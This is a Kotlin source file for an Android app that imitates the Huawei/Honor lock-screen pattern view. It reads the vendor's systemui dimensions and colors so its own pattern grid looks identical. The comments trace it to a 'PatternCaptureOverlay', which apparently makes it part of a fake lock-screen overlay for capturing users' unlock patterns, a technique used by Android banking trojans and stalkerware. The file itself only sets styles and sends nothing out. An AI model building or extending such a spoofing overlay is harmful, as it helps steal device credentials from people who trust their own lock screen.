package com.storm.safe.rock.service.modules.cipher.vendor

import android.content.Context
import android.content.res.Resources
import com.storm.safe.rock.service.modules.cipher.PatternLockView

/**
 * Huawei / Honor cipher strategy.
 *
 * Extracted from PatternCaptureOverlay brand branches:
 * - Fallback style: white dots, gray lines
 * - Resource reading: 5-level hw_ fallback + hwlock_ color resources
 */
class HuaweiCipherStrategy : CipherBrandStrategy() {

    override val tag = "HuaweiCipher"

    /**
     * Huawei fallback pattern style.
     * White -1, gray lines -7829368, dotNormal=32, dotSelected=50, pathWidth=20.
     * vendor: PatternCaptureOverlay Huawei branch
     */
    override fun applyPatternFallbackStyle(view: PatternLockView, themeColor: Int, density: Float) {
        view.normalStateColor = -1             // white
        view.correctStateColor = -1
        view.dotNormalSize = 32
        view.dotSelectedSize = 50
        view.dotSelectedColor = -1
        view.pathWidth = 20
        view.pathColor = -7829368              // gray (0xFF888888)
        view.aspectRatio = 0
        view.dotAnimationDuration = 150
        view.pathEndAnimationDuration = 100
    }

    /**
     * Huawei resource reading: 5-level fallback.
     * hw_lock_pattern_dot_size_1 -> hw_lock_pattern_dot_size_2 ->
     * hw_lock_pattern_dot_size_3 -> hw_lock_pattern_dot_size ->
     * lock_pattern_dot_size (AOSP)
     * Plus hwlock_ color resources.
     * vendor: PatternCaptureOverlay Huawei resource branch
     */
    override fun readBrandResources(res: Resources, suiContext: Context, density: Float): BrandResourceResult? {
        val dimenNames = listOf(
            "hw_lock_pattern_dot_size_1",
            "hw_lock_pattern_dot_size_2",
            "hw_lock_pattern_dot_size_3",
            "hw_lock_pattern_dot_size",
            "lock_pattern_dot_size"     // AOSP fallback
        )
        var dotSize = 0
        for (name in dimenNames) {
            val id = res.getIdentifier(name, "dimen", "com.android.systemui")
            if (id != 0) {
                dotSize = res.getDimensionPixelSize(id)
                if (dotSize > 0) break
            }
        }
        if (dotSize <= 0) return null

        // Huawei color resources
        var dotColor = 0
        var pathColor = 0
        for (name in listOf("hwlock_pattern_dot_color", "hw_lock_pattern_dot_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                dotColor = res.getColor(id, suiContext.theme)
                break
            }
        }
        for (name in listOf("hwlock_pattern_path_color", "hw_lock_pattern_path_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                pathColor = res.getColor(id, suiContext.theme)
                break
            }
        }

        return BrandResourceResult(
            haloSize = dotSize * 3,
            innerDotSize = dotSize,
            pathWidth = 0,
            dotColor = dotColor,
            pathColor = pathColor
        )
    }
}
